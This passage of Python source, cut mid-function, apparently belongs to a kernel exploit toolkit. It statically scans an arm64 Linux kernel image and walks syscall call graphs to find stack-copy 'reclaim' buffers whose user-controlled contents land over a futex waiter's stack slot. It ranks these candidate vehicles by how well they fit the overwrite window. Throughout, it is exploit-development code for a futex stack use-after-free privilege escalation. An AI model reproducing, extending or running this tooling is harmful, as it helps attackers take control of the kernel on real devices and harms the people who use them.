                slots.pop(add[0], None)
            continue
        mv = _mov_reg(w)
        if mv is not None:
            d, s = mv
            if s in slots:
                slots[d] = slots[s]
            else:
                slots.pop(d, None)
            (heap.add if s in heap else heap.discard)(d)
            if s in movz:
                movz[d] = movz[s]
            else:
                movz.pop(d, None)
            src[d] = s
            continue
        c = _disc_cmp_imm(w)
        if c is not None:
            if _disc_is_bcond(_u32(img, start - text + i + 4)):
                cmp_of[c[0]] = c[1]
            continue
        cs = _disc_csel(w)
        if cs is not None:
            d, n, m = cs
            bound = movz.get(n)
            if m in movz:
                bound = movz[m] if bound is None else min(bound, movz[m])
            if bound is not None:
                cmp_of[d] = bound
            movz.pop(d, None)
            src.pop(d, None)
            continue
        m = _movz_imm(w)
        if m is not None:
            movz[m[0]] = m[1]
            heap.discard(m[0])
            src.pop(m[0], None)
            continue
        z = _disc_zero_store_sp(w)
        if z is not None:
            zeros[z[0]] = z[1]
            continue
        tgt = _bl_target(w, start + i)
        if tgt is None:
            continue
        if tgt in memset_addrs and 0 in slots and 2 in movz:
            memset_of[slots[0]] = movz[2]
        elif tgt in copy_addrs and 0 in slots and 0 not in heap:
            slot = slots[0]
            lenreg = 3 if tgt in sockptr_addrs else 2
            size = how = None
            if lenreg in movz:
                size, how = movz[lenreg], "movz"
            elif slot in memset_of:
                size, how = memset_of[slot], "memset"
            elif lenreg in cmp_of:
                size, how = cmp_of[lenreg], "cmp"
            elif src.get(lenreg) in cmp_of:
                size, how = cmp_of[src[lenreg]], "cmp"
            elif slot in zeros:
                span_z = _disc_zero_span(zeros, slot)
                if span_z >= _WAITER_SPAN:
                    size, how = span_z, "zero"
            memset = memset_of.get(slot)
            if memset is None and slot in zeros:
                memset = _disc_zero_span(zeros, slot)
            if isinstance(size, int) and size >= _WAITER_SPAN:
                out.append({
                    "slot": slot, "size": size, "how": how, "memset": memset,
                    "sp_uncertain": gaveback,
                    "fails_clean": _disc_fails_clean(img, syms, text, fn, i),
                    "compat_only": _disc_compat_only(img, syms, text, fn, i),
                })
        for r in range(0, 19):              # caller-saved: clobbered by the call
            movz.pop(r, None)
            cmp_of.pop(r, None)
            src.pop(r, None)
            slots.pop(r, None)
            heap.discard(r)
        if tgt in alloc_addrs:
            heap.add(0)
    _DISC_COPIES[fn] = tuple(out)
    return _DISC_COPIES[fn]


def discover_vehicles(img, syms, text, roots=None, max_depth=8, near=0):
    """Sweep the call graph from each syscall entry for stack-copy reclaim
    buffers and report those landing in (or within `near` bytes of) a usable
    window. Returns a list of dicts sorted by how deep in window they land:
        root, copy_fn, slot, size, off, low, high, in_window, path
    `roots`: a list of entry symbols, or "all" for every __arm64_sys_*; the
    default is _DISCOVER_DEFAULT_ROOTS. Call load_duplicate_addrs() first.

    Each row carries the checks the copy scan derived: sp_uncertain (a stack
    giveback makes the slot -- and the verdict -- unconfirmable by static scan),
    ambiguous (two call paths reach the same copy at different depths, so the
    offset is one of `alt`), fails_clean and compat_only. in_window is the
    geometric test AND not sp_uncertain: an uncertain copy is never reported as
    a confident vehicle."""
    if roots is None:
        roots = _DISCOVER_DEFAULT_ROOTS
    elif roots == "all":
        roots = tuple(sorted(n for n in syms if n.startswith("__arm64_sys_")))

    fut_frames = [_frame_of(img, syms, n, text) for n in _FUTEX_CHAIN]
    if any(f is None for f in fut_frames) or any(
            n not in syms for n in _FUTEX_CHAIN):
        return []
    span_a = _func_span(syms, _FUTEX_CHAIN[-1], _SPAN_CAP)
    slot_a, _ = _witness_slot(img, syms, text, _FUTEX_CHAIN[-1], span_a,
                              _WAITER_WITNESSES)
    if slot_a is None:
        return []
    futex_abs = -sum(fut_frames) + slot_a

    found = {}                              # (copy_fn, slot) -> row
    for root in roots:
        if root not in syms or _frame_of(img, syms, root, text) is None:
            continue
        # BFS from this root; frames of the reached path sum to the copy's own.
        seen = {root}
        queue = [(root, _frame_of(img, syms, root, text), (root,))]
        while queue:
            fn, acc, path = queue.pop(0)
            for c in _stack_copies_in(img, syms, text, fn):
                slot, size = c["slot"], c["size"]
                off = futex_abs - (-acc + slot)
                low, high = -8, size - _WAITER_SPAN     # widest (narrow) window
                if off < low - near or off > high + near:
                    continue
                geom = low <= off <= high
                key = (fn, slot)
                prev = found.get(key)
                if prev is None:
                    found[key] = {
                        "root": root, "copy_fn": fn, "slot": slot,
                        "size": size, "off": off, "low": low, "high": high,
                        "in_window": geom and not c["sp_uncertain"],
                        "sp_uncertain": c["sp_uncertain"],
                        "fails_clean": c["fails_clean"],
                        "compat_only": c["compat_only"],
                        "ambiguous": False, "alt": (), "path": path,
                    }
                else:
                    # A second copy at the same slot: keep the largest (widest
                    # window). A second PATH to it at a different depth means the
                    # offset is path-dependent -- flag it rather than silently
                    # keeping the shorter path's.
                    if off != prev["off"]:
                        prev["ambiguous"] = True
                        prev["alt"] = tuple(sorted(set(prev["alt"]) | {off}))
                    if size > prev["size"] or (
                            size == prev["size"] and len(path) < len(prev["path"])):
                        prev.update(
                            slot=slot, size=size, off=off, low=low, high=high,
                            in_window=geom and not c["sp_uncertain"],
                            sp_uncertain=c["sp_uncertain"],
                            fails_clean=c["fails_clean"],
                            compat_only=c["compat_only"], path=path)
            if len(path) >= max_depth:
                continue
            children = list(_call_targets(img, syms, text, fn))
            children += list(_DISCOVER_SEED_EDGES.get(fn, ()))
            for c in children:
                if (c in seen or c not in syms
                        or _frame_of(img, syms, c, text) is None):
                    continue
                seen.add(c)
                queue.append((c, acc + _frame_of(img, syms, c, text),
                              path + (c,)))
    rows = list(found.values())
    rows.sort(key=lambda r: (not r["in_window"], r["sp_uncertain"],
                             -r["size"], abs(r["off"])))
    return rows


_SORTED_ADDRS = {}              # id(syms) -> sorted distinct addresses (cache)


def _func_span(syms, name, cap):
    """Distance to the next symbol, capped — the function's extent."""
    here = syms[name]
    key = id(syms)
    arr = _SORTED_ADDRS.get(key)
    if arr is None:
        arr = sorted(set(syms.values()))
        _SORTED_ADDRS[key] = arr
    i = _bisect.bisect_right(arr, here)
    return min(cap, arr[i] - here) if i < len(arr) else cap
